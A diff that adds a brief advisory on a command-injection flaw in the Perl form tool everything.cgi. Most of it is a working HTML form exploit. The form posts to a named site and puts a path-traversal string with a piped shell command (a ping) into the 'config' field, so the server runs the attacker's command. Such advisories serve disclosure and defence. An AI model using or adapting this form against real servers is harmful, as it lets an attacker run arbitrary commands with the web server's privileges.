@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/2101/info
+
+An input validation vulnerability exists in Leif M. Wright's everything.cgi, a Perl-based form design tool.
+
+The script fails to properly filter shell commands from user-supplied input to the 'config' field.
+
+As a result, the script can be made to run arbitrary shell commands with the privilege of the web server.
+
+<form action="http://www.conservatives.net/someplace/everythingform.cgi"
+method=POST>
+<h1>everythingform.cgi exploit</h1>
+Command: <input type=text name=config value="../../../../../../../../bin/ping
+-c 5 www.foobar.com|">
+<input type=hidden name=Name value="expletive deleted">
+<input type=hidden name="e-mail" value="foo@bar.net">
+<input type=hidden name=FavoriteColor value=Black>
+<input type=submit value=run>
+</form> 
